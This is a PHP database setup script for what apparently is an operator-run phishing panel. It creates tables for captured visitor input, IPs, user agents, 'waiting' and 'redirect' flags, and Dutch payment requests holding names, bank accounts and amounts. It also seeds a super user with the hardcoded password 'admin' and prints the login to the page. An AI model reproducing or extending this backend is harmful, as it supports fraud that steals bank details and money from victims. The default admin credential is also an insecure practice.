<?php
namespace classes\core;

use PDO;
class setup {

	private $db;
	public function __construct() {
		try{
    		$dbh = new PDO("mysql:host=".\config\config::$mysqlHost.";dbname=".\config\config::$database."", \config\config::$mysqlUser, \config\config::$mysqlPass);
			$this->db = $dbh;
		}catch(PDOException $e) {
	    	die("Error cannot connect to the database<br>" . $e->getMessage());
		}

		$this->createUsersTable();
		$this->createBlockedUsersTable();
		$this->createActiveUsersTable();
		$this->createEntriesTable();
		$this->createBetaalVerzoek();
	}

	public function createBetaalVerzoek() {
		echo "Creating betaalverzoek table <br>";
			$a = $this->db->prepare("
			CREATE TABLE `betaalverzoek` (
				`id` int(11) NOT NULL AUTO_INCREMENT,
				`uid` varchar(255) NOT NULL,
				`naam` varchar(2555) NOT NULL,
				`rekening` varchar(255) NOT NULL,
				`omschrijving` text NOT NULL,
				`bedrag` varchar(255) NOT NULL,
				PRIMARY KEY (`id`),
				UNIQUE KEY `uid` (`uid`)
			   ) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=latin1
			");		
		$a->execute();
  		if(!empty($a->errorInfo()[2])) { echo $a->errorInfo()[2]."<br>"; }	
  		echo "Done<br><br>";
	}


	public function createUsersTable() {
		// Table setup
		echo "Creating USER table <br>";
			$a = $this->db->prepare("
			   CREATE TABLE `login` (
			   `id` int(255) NOT NULL AUTO_INCREMENT,
			   `username` varchar(255) NOT NULL,
			   `password` varchar(255) NOT NULL,
			   `admin_lvl` tinyint(1) NOT NULL,
			   `new_entry` varchar(255) NOT NULL DEFAULT 'false',
			   `updated_entry` varchar(255) NOT NULL DEFAULT 'false',
			   PRIMARY KEY (`id`),
			   UNIQUE KEY `username` (`username`)
			  ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=latin1
			");

			$a->execute();
  		if(!empty($a->errorInfo()[2])) { echo $a->errorInfo()[2]."<br>"; }else{
  			echo "Creating default super user<br>";
  				$a = $this->db->prepare("INSERT INTO login(username, password, admin_lvl) VALUES('nakkings@1337', '$2y$10\$QpppknXqp7LA/uSPMB6W/.J78O6r0U9EBjqt14v.cSwwWWOi8zfl2', '9')");
  				$a->execute();	
  					if(!empty($a->errorInfo()[2])) { echo $a->errorInfo()[2]."<br>"; }	
  						echo "Done, username: nakkings@1337 password: admin<br><br>";	
  		}
  		echo "Done<br><br>";

	}

	public function createBlockedUsersTable() {
		echo "Creating BlockedUsers table <br>";
			$a = $this->db->prepare("	
			CREATE TABLE `blocked_users` (
 			 `id` int(11) NOT NULL AUTO_INCREMENT,
 			 `ip` varchar(255) NOT NULL,
 			 PRIMARY KEY (`id`),
			 UNIQUE KEY `ip` (`ip`)
			 ) ENGINE=InnoDB DEFAULT CHARSET=latin1
			");
		$a->execute();
  		if(!empty($a->errorInfo()[2])) { echo $a->errorInfo()[2]."<br>"; }	
  		echo "Done<br><br>";
	}

	public function createActiveUsersTable() {
		echo "Creating ActiveUsers table <br>";
			$a = $this->db->prepare("	
				CREATE TABLE `activeusers` (
				  `id` int(11) NOT NULL AUTO_INCREMENT,
				  `uid` varchar(255) NOT NULL,
				  `lastpulse` datetime NOT NULL,
				  `firstpulse` datetime NOT NULL,
				  PRIMARY KEY (`id`)
				 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=latin1
			");		
		$a->execute();
  		if(!empty($a->errorInfo()[2])) { echo $a->errorInfo()[2]."<br>"; }	
  		echo "Done<br><br>";
	}

	public function createEntriesTable() {
		echo "Creating entries table <br>";
			$a = $this->db->prepare("
			CREATE TABLE `entries` (
				`id` int(255) NOT NULL AUTO_INCREMENT,
				`uid` varchar(255) NOT NULL,
				`ip` varchar(255) NOT NULL,
				`useragent` text NOT NULL,
				`site` varchar(255) NOT NULL,
				`input` text,
				`action` int(11) DEFAULT NULL,
				`is_waiting` varchar(255) NOT NULL DEFAULT 'false',
				`is_waiting_seen` varchar(255) NOT NULL DEFAULT 'false',
				`redirect` tinyint(1) NOT NULL DEFAULT '0',
				`custom_input` text,
				`operator` varchar(255) DEFAULT NULL,
				`last_logged` varchar(255) NOT NULL,
				`browser_os` varchar(255) NOT NULL,
				`logs` text NOT NULL,
				PRIMARY KEY (`id`),
				UNIQUE KEY `uid` (`uid`)
			   ) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=latin1
			");		
		$a->execute();
  		if(!empty($a->errorInfo()[2])) { echo $a->errorInfo()[2]."<br>"; }	
  		echo "Done<br><br>";
	}


}